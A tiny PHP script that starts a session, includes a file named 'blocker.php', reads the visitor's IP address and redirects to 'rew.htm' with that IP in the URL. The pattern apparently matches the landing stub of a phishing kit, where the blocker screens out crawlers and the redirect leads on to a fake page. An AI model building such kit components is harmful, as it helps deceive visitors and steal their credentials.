<?php
session_start();
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

header("Location: rew.htm?ip=$ip");
?>